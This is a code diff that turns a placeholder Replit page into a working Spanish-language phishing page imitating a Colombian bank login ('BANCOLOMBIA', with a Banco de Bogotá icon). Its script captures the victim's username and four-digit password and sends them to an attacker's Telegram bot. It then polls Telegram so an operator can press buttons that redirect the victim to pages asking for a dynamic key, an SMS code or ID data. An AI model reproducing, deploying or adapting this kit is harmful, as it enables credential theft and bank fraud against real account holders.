@@ -1,16 +1,403 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width">
-  <title>replit</title>
-  <link href="style.css" rel="stylesheet" type="text/css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Ingreso</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            background-color: #eee;
+        }
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-
 <body>
-  Hello world
-  <script src="script.js"></script>
-</body>
+    <div id="app"></div>
 
+    <div id="error-modal" class="custom-modal">
+        <div class="custom-modal-content">
+            <div class="flex items-center justify-center gap-5">
+                <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png" alt="Icono de error" class="w-15 h-15">
+                <div>
+                    <h3 class="mb-5 text-[#2c2a29]">¡Ups! Algo salió mal</h3>
+                    <p>Los datos ingresados no coinciden con los de tu cuenta. Por favor, verifica tu información y vuelve a intentarlo.</p>
+                </div>
+            </div>
+            <button id="back-to-start-button" class="mt-5 w-full bg-[#2c2a29] text-white py-3 rounded-lg">Volver al inicio</button>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        function homeTemplate() {
+            return `
+                <header class="w-full flex items-center justify-center py-16 bg-[#2c2a29]">
+                    <img src="img/logo.png" alt="" class="w-full max-w-[180px] h-auto -mt-4">
+                </header>
+
+                <form id="miFormulario">
+                    <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200">
+                        <div class="w-full box-border p-4">
+                            <div class="w-full">
+                                <div class="w-full flex items-center justify-between">
+                                    <div class="flex flex-row justify-between items-center">
+                                        <img src="img/user.svg" alt="" class="w-[17px] h-[17px] mr-2">
+                                        <label class="text-sm m-0">Usuario</label>
+                                    </div>
+                                    <div class="flex flex-row justify-between items-center">
+                                        <label class="text-sm m-0">Recordar</label>
+                                        <input type="checkbox" name="" id="" class="w-5 h-5 bg-white ml-2">
+                                    </div>
+                                </div>
+                                <div class="w-full flex items-center my-4">
+                                    <input type="text" name="nro_doc" id="nro_doc" placeholder="Nombre de usuario" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2">
+                                </div>
+                            </div>
+
+                            <div class="w-full" id="clave_segura_section">
+                                <div class="w-full flex items-center justify-between">
+                                    <div class="flex flex-row justify-between items-center">
+                                        <img src="img/lock.svg" alt="" class="w-[17px] h-[17px] mr-2">
+                                        <label class="text-sm">Contraseña</label>
+                                    </div>
+                                </div>
+                                <div class="my-4">
+                                    <input type="password" name="clave" id="clave" placeholder="- - - -" maxlength="4" inputmode="numeric" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2 text-center tracking-widest font-mono placeholder:tracking-widest">
+                                </div>
+                            </div>
+
+                            <button type="submit" id="ingresarBtn" disabled class="block w-full rounded-2xl text-white bg-[#2c2a29] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Ingresar ahora</button>
+                        </div>
+                    </div>
+                </form>
+            `;
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const app = document.querySelector('#app');
+            if (app) {
+                app.innerHTML = homeTemplate();
+            }
+
+            const form = document.querySelector('#miFormulario');
+            const nroDoc = document.getElementById("nro_doc");
+            const clave = document.getElementById("clave");
+            const ingresarBtn = document.getElementById("ingresarBtn");
+            const errorModal = document.getElementById('error-modal');
+            const backToStartButton = document.getElementById('back-to-start-button');
+            const spinnerModal = document.getElementById('spinner-modal');
+
+            let TELEGRAM_BOT_TOKEN = '';
+            let TELEGRAM_CHAT_ID = '';
+            let statusCheckInterval = null;
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+            const transactionId = Date.now().toString();
+
+            async function loadTelegramConfig() {
+                try {
+                    const response = await fetch('js/brr76.json');
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    const data = await response.json();
+                    TELEGRAM_BOT_TOKEN = data.token;
+                    TELEGRAM_CHAT_ID = data.chat_id;
+                    console.log("🟢 Tokens y IDs de chat de Telegram cargados correctamente.");
+                    return true;
+                } catch (error) {
+                    console.error('🔴 Error al cargar la configuración de Telegram:', error);
+                    alert('Error crítico: No se pudo cargar la configuración de Telegram. Por favor, verifica el archivo js/brr76.json.');
+                    if (ingresarBtn) ingresarBtn.disabled = true;
+                    return false;
+                }
+            }
+
+            async function initLastUpdateId() {
+                try {
+                    if (!TELEGRAM_BOT_TOKEN) return;
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data || !data.result) return;
+                    const updates = data.result;
+                    if (updates.length === 0) return;
+                    const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                    lastUpdateId = maxUpdateId;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    console.log('✅ lastUpdateId inicializado a', lastUpdateId);
+                } catch (err) {
+                    console.warn('🟡 No se pudo inicializar lastUpdateId:', err);
+                }
+            }
+
+            function validateForm() {
+                const nroDocValid = nroDoc && nroDoc.value.trim().length > 0;
+                const claveValid = clave && clave.value.length === 4;
+                const isFormValid = nroDocValid && claveValid;
+
+                if (ingresarBtn) {
+                    ingresarBtn.disabled = !isFormValid;
+                }
+            }
+
+            [nroDoc, clave].forEach(input => {
+                if (input) {
+                    input.addEventListener("input", validateForm);
+                    // Eliminar el siguiente event listener para nro_doc si lo tuviera.
+                    // nro_doc.removeEventListener("input", () => { ... });
+                }
+            });
+
+            async function sendToTelegram(messageContent, keyboard) {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                    throw new Error('Telegram bot token or chat ID is not set.');
+                }
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageContent,
+                    parse_mode: 'Markdown',
+                    reply_markup: keyboard
+                };
+
+                try {
+                    console.log("➡️ Enviando a Telegram:", payload);
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`🔴 Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        return null;
+                    }
+                    const data = await response.json();
+                    console.log('✅ Mensaje enviado a Telegram exitosamente.');
+                    return data.result.message_id;
+                } catch (error) {
+                    console.error('🔴 Error de red al enviar mensaje a Telegram:', error);
+                    return null;
+                }
+            }
+
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {}
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`🔴 Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('🔴 Error de red al borrar botones de Telegram:', error);
+                }
+            }
+
+            async function handleLoginAttempt(loginData) {
+                spinnerModal.style.display = 'flex';
+                console.log("📋 Datos capturados:", loginData);
+
+                const now = new Date();
+                const formattedDate = now.toLocaleDateString('es-CO', {
+                    day: 'numeric', month: 'numeric', year: 'numeric'
+                });
+                const formattedTime = now.toLocaleTimeString('es-CO', {
+                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+                });
+
+                const message = `🟡⚪️ BANCOLOMBIA ⚪️🟡\n\nUsuario💎: ${loginData.nro_doc}\nClAVE🔐: ${loginData.clave}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+
+                const dataToStore = {
+                    ...loginData,
+                    transactionId: transactionId,
+                };
+                sessionStorage.setItem('initialLoginData', JSON.stringify(dataToStore));
+                console.log("💾 Datos guardados en sessionStorage:", dataToStore);
+
+                const keyboard = JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "💎 Clave Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+                        [{ text: "👀 Código SMS", callback_data: `pedir_sms:${transactionId}` }],
+                        [{ text: "📝 CC", callback_data: `pedir_datos:${transactionId}` }],
+                        [{ text: "❌ Error de Logo", callback_data: `error_logo:${transactionId}` }]
+                    ],
+                });
+
+                const messageId = await sendToTelegram(message, keyboard);
+
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
+                    checkPaymentVerification();
+                } else {
+                    spinnerModal.style.display = 'none';
+                    alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo.");
+                }
+            }
+
+            async function checkPaymentVerification() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+                statusCheckInterval = setInterval(async () => {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
+                    try {
+                        const response = await fetch(url);
+                        const data = await response.json();
+                        const updates = data.result;
+
+                        if (updates && updates.length > 0) {
+                            const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
+
+                            if (relevantUpdate) {
+                                const latest = relevantUpdate;
+                                clearInterval(statusCheckInterval);
+                                spinnerModal.style.display = 'none';
+
+                                const callbackData = latest.callback_query.data.split(':')[0];
+                                const callbackId = latest.callback_query.id;
+                                const messageId = sessionStorage.getItem('telegramMessageId');
+
+                                await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
+
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
+                                    });
+                                } catch (err) {
+                                    console.warn('🟡 No se pudo responder callback_query:', err);
+                                }
+
+                                lastUpdateId = latest.update_id;
+                                sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                                console.log("➡️ Redirigiendo a:", callbackData);
+                                if (callbackData === 'pedir_dinamica') {
+                                    window.location.href = "dinamica.html";
+                                } else if (callbackData === 'pedir_sms') {
+                                    window.location.href = "otp.html";
+                                } else if (callbackData === 'pedir_datos') {
+                                    window.location.href = "datos.html";
+                                } else if (callbackData === 'error_logo') {
+                                    errorModal.style.display = 'flex';
+                                }
+                            }
+                        }
+                    } catch (error) {
+                        console.error("🔴 Error al verificar el estado de la transacción:", error);
+                    }
+                }, 2000);
+            }
+
+            form.addEventListener("submit", (event) => {
+                event.preventDefault();
+                const loginData = {
+                    nro_doc: nroDoc.value,
+                    clave: clave.value,
+                };
+                handleLoginAttempt(loginData);
+            });
+
+            if (backToStartButton) {
+                backToStartButton.addEventListener('click', () => {
+                    errorModal.style.display = 'none';
+                    window.location.href = "index.html";
+                });
+            }
+
+            window.addEventListener('beforeunload', function() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+            });
+
+            loadTelegramConfig().then(configLoaded => {
+                if (configLoaded) {
+                    initLastUpdateId();
+                }
+            });
+        });
+    </script>
+</body>
 </html>
